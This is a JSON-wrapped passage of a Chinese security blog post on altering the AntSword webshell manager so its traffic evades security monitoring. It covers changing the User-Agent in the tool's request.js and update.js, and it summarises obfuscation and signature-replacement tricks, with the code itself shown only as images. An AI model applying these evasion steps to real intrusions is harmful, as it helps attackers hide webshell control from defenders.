alt=\"image.png\"><br>从流量加密来分析的话，已经能绕过态势感知和全流量分析机。</p>\n<h3 id=\"蚁剑UA头的修改：\"><a href=\"#蚁剑UA头的修改：\" class=\"headerlink\" title=\"蚁剑UA头的修改：\"></a>蚁剑UA头的修改：</h3><h4 id=\"在burp的数据包中能清楚的看到蚁剑的特征\"><a href=\"#在burp的数据包中能清楚的看到蚁剑的特征\" class=\"headerlink\" title=\"在burp的数据包中能清楚的看到蚁剑的特征\"></a>在burp的数据包中能清楚的看到蚁剑的特征</h4><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3034ef2a238786efbb09f2f1dea96a082dad330f.png\" alt=\"image.png\"></p>\n<h4 id=\"在目录-x2F-modules-x2F-request-js文件中修改UA头\"><a href=\"#在目录-x2F-modules-x2F-request-js文件中修改UA头\" class=\"headerlink\" title=\"在目录&#x2F;modules&#x2F;request.js文件中修改UA头\"></a>在目录&#x2F;modules&#x2F;request.js文件中修改UA头</h4><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a9fa6d53837e759bb5cc34c21bdab23b3328795b.png\" alt=\"image.png\"></p>\n<h4 id=\"x2F-modules-x2F-update-js文件修改\"><a href=\"#x2F-modules-x2F-update-js文件修改\" class=\"headerlink\" title=\"&#x2F;modules&#x2F;update.js文件修改\"></a>&#x2F;modules&#x2F;update.js文件修改</h4><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ec910b44405624877aa3e24d3bd95d0138c63d1d.png\" alt=\"image.png\"></p>\n<h1 id=\"0x03-总结：\"><a href=\"#0x03-总结：\" class=\"headerlink\" title=\"0x03 总结：\"></a>0x03 总结：</h1><p>关于免杀来说，通常是进行代码加密混淆，特征码替换或者分割传输等情况。之前有想写过shellcode免杀，但是还没有过windows defender，所以就推迟一段时间来写。感谢各位拜读。</p>\n","feature":true,"text":"AntSword0x00 前言：为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"免杀","slug":"免杀","count":1,"path":"api/tags/免杀.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#AntSword\"><span class=\"toc-text\">AntSword</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00-%E5%89%8D%E8%A8%80%EF%BC%9A\"><span class=\"toc-text\">0x00 前言：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E8%9A%81%E5%89%91%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E6%94%B9%E7%BC%96%EF%BC%9A\"><span class=\"toc-text\">0x01 蚁剑介绍及其改编：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%9A%81%E5%89%91%E9%BB%98%E8%AE%A4%E6%B5%81%E9%87%8F\"><span class=\"toc-text\">蚁剑默认流量</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%BB%98%E8%AE%A4%E7%9A%84base64%E7%BC%96%E7%A0%81%E5%99%A8\"><span class=\"toc-text\">默认的base64编码器</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%BBgithub%E4%B8%8A%E6%89%BE%E5%88%B0%E8%9A%81%E5%89%91%E7%9A%84%E7%BC%96%E7%A0%81%E5%99%A8%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E8%A7%A3%E7%A0%81%E5%99%A8\"><span class=\"toc-text\">去github上找到蚁剑的编码器和对应的解码器</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%BB%98%E8%AE%A4webshell%E8%AE%B2%E8%A7%A3%EF%BC%9A\"><span class=\"toc-text\">默认webshell讲解：</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%9D%E6%AD%A5%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84webshell%EF%BC%9A\"><span class=\"toc-text\">初步修改后的webshell：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B7%B7%E6%B7%86%E4%B9%8B%E5%90%8E%E7%9A%84webshell%EF%BC%9A\"><span class=\"toc-text\">混淆之后的webshell：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%9A%81%E5%89%91UA%E5%A4%B4%E7%9A%84%E4%BF%AE%E6%94%B9%EF%BC%9A\"><span class=\"toc-text\">蚁剑UA头的修改：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9C%A8burp%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E8%83%BD%E6%B8%85%E6%A5%9A%E7%9A%84%E7%9C%8B%E5%88%B0%E8%9A%81%E5%89%91%E7%9A%84%E7%89%B9%E5%BE%81\"><span class=\"toc-text\">在burp的数据包中能清楚的看到蚁剑的特征</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9C%A8%E7%9B%AE%E5%BD%95-x2F-modules-x2F-request-js%E6%96%87%E4%BB%B6%E4%B8%AD%E4%BF%AE%E6%94%B9UA%E5%A4%B4\"><span class=\"toc-text\">在目录&#x2F;modules&#x2F;request.js文件中修改UA头</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#x2F-modules-x2F-update-js%E6%96%87%E4%BB%B6%E4%BF%AE%E6%94%B9\"><span class=\"toc-text\">&#x2F;modules&#x2F;update.js文件修改</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x03-%E6%80%BB%E7%BB%93%EF%BC%9A\"><span class=\"toc-text\">0x03 总结：</span></a></li></ol>","author":{"name":"Q16G","slug":"blog-author","avatar":"https://www.helloimg.com/images/2023/05/23/oJaeo5.jpg","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"关于某次授权的大型内网渗透测试","uid":"6926437034a0cc884741b3438fbe3704","slug":"关于某次授权的大型内网渗透测试","date":"2023-05-24T02:43:26.000Z","updated":"2023-05-24T15:10:08.488Z","comments":true,"path":"api/articles/关于某次授权的大型内网渗透测试.json","keywords":null,"cover":[],"text":"接到朋友邀请，要对一个站点进行全面渗透，内网发现多DC主机，遂记录。 背景：接到朋友邀请，要进行一个授权站点的渗透，但是进去实际环境才发现是多域控主机。也学习了很多后渗透手法，比较受益匪浅。 前期渗透：打点：（任意文件上传）直接发现头像处任意文件上传，这里直接上传冰蝎即可。 ta...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","count":2,"path":"api/tags/内网渗透.json"}],"author":{"name":"Q16G","slug":"blog-author","avatar":"https://www.helloimg.com/images/2023/05/23/oJaeo5.jpg","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{}}